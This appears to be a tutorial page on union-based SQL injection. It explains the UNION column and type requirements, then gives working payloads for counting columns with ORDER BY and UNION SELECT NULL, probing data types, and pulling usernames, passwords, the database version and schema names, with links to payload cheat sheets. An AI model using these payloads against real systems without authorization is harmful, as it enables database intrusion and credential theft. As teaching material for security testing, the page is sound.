In a **Union-Based SQL Injection**, the attacker leverages the `UNION` SQL operator to combine results from the original query with results from their injected query. 

When an attacker uses Union-Based SQL Injection, they attempt to combine the results of the original query with their own injected query. However, for this to work properly, certain conditions must be met:

- **Number of Columns**: The original query and the injected query must have the same number of columns.
- **Compatible Data Types**: The data types of the columns in both queries must be compatible.


---
## Cheat Sheets
It is very important to consult these resources available in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) to correctly execute an SQL injection attack after verifying its existence:
- [MySQL SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md) 
- [Oracle SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)  
- [PostgreSQL SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
- [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)


---

## 1. Determining the Number of Columns

To carry out a successful `UNION` attack, first we need to know the number of columns in the original query. This is crucial because the `UNION` operator requires both queries to have the **same number of columns** and **compatible data types** to avoid errors. There are two main methods for identifying this:

#### Using ORDER BY

By incrementally increasing the column number in `ORDER BY` clauses, we can find the number of columns by identifying when an error occurs. For example:

```sql
' ORDER BY 1 -- (no error, at least 1 column)

' ORDER BY 2 -- (no error, at least 2 columns)

' ORDER BY N -- (error 500, N exceeds the column count)
```
> Note the space after '--'

Once a certain number causes an error, we can deduce that the original query has fewer columns than this value.

#### Using UNION SELECT 

Another approach is to inject `UNION SELECT NULL` with different counts of `NULL` values, matching the number of columns until there’s no error. For example:

```sql
' UNION SELECT NULL -- (error, as more than one column is likely present)

' UNION SELECT NULL, NULL -- (no error, meaning the query likely has 2 columns)

' UNION SELECT NULL, NULL, NULL -- (error, meaning only 2 columns exist)
```

Another way to discover the number of columns in a vulnerable query is by using `' UNION SELECT` with sequential numbers.

```sql
' UNION SELECT 1 -- (error, probably more columns)

' UNION SELECT 1,2 -- (error, keep trying)

' UNION SELECT 1,2,3 -- (no error, 3 columns found)
```

Once the correct number of columns is determined, the information extraction can be executed.

## 2. Identifying Data Types for Columns

After determining the number of columns, we need to identify the data type for each column because the `UNION` operator only works when column data types match across the original and injected query. This is achieved by using `UNION SELECT` injections to test for data types one by one.

#### Methods for Testing Data Types:

- **String Data Type:** Inject a string (e.g., `'a'`) in a `NULL` placeholder to check if a column accepts text.

- **Numeric Data Type:** Use numbers in `NULL` positions to determine columns that accept integers.

- **Date Data Type:** Insert a date value (e.g., `'2023-01-01'`) to test if a column accepts dates.


For example:

```sql
' UNION SELECT 'a', NULL, NULL -- (no error means the first column is likely a text type)

' UNION SELECT NULL, 123, NULL -- (no error means the second column is likely an integer)
```

> **Important Oracle Note**:
 On **Oracle** databases, every **SELECT** statement must specify a table to select from. If your **UNION SELECT** attack does not query from a table, you will still need to include the **`FROM`** keyword followed by a valid table name. A built-in table on Oracle called `dual` can be used for this purpose: `' UNION SELECT 'abc' FROM dual --`  

## 3. Extracting Sensitive Data

Once we know the number and type of columns, they can extract sensitive data by injecting a query that retrieves this data from other tables within the database:

```sql
' UNION SELECT NULL, username, password FROM users --
```

In this example, the `username` and `password` columns are retrieved from the `users` table.

> In case the extraction field is numeric, it may be useful to indicate negative numbers. This way, a SELECT is not performed on that numeric value and the desired value is selected instead, for example:
`id = -1 UNION SELECT NULL, database(), NULL --`
#### Additional Information Extraction

- **Obtain the current database name:**

```sql
' UNION SELECT NULL, database(), NULL -- 
```

- **Check the database version:**

```sql
' UNION SELECT NULL, version(), NULL -- 
```

- **List available tables in information_schema.tables:**
```sql
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- 
```

- **List column names from a specific table:**

```sql
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' -- 
```

